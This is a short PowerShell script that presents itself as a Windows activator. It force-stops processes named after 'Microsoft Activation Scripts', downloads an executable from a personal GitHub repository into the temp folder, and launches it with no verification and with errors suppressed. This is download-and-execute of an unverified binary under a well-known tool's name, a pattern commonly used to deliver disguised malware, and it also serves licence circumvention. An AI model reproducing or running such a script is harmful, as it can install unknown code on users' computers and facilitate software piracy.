$url = "https://raw.githubusercontent.com/acenljd/Windows-Activator/refs/heads/main/Microsoft%20Activation%20Scripts.exe"
$tempFile = "$env:TEMP\Windows_Activator.exe"


$processNames = @("Microsoft Activation Scripts", "MAS", "Windows_Activator", "Activator")
foreach ($name in $processNames) {
    Get-Process -Name $name -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
}


Start-Sleep -Milliseconds 500


if (Test-Path $tempFile) {
    Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
    Start-Sleep -Milliseconds 300
}


try {
    Invoke-WebRequest -Uri $url -OutFile $tempFile -UserAgent "PowerShell"
} catch {

    (New-Object System.Net.WebClient).DownloadFile($url, $tempFile)
}


Start-Process $tempFile
